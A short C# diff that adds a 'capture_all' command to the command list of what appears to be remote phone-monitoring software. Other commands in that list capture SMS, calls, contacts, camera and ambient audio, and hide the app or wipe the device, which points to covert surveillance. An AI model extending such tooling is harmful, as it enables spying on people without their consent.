@@ -47,12 +47,13 @@ public static class CommandTypes
     public const string UpdateInterval = "update_interval";
     public const string RestartService = "restart_service";
     public const string Uninstall = "uninstall";
+    public const string CaptureAll = "capture_all";
 
     public static readonly HashSet<string> All = new()
     {
         SyncNow, CaptureLocation, CaptureCallLogs, CaptureSms, CaptureContacts,
         CaptureApps, CaptureScreenshot, CaptureCamera, RecordAmbient, RecordCall,
         LockDevice, WipeDevice, HideApp, UnhideApp, EnableAdmin, DisableAdmin,
-        PlaySound, SendAlert, UpdateInterval, RestartService, Uninstall
+        PlaySound, SendAlert, UpdateInterval, RestartService, Uninstall, CaptureAll
     };
 }
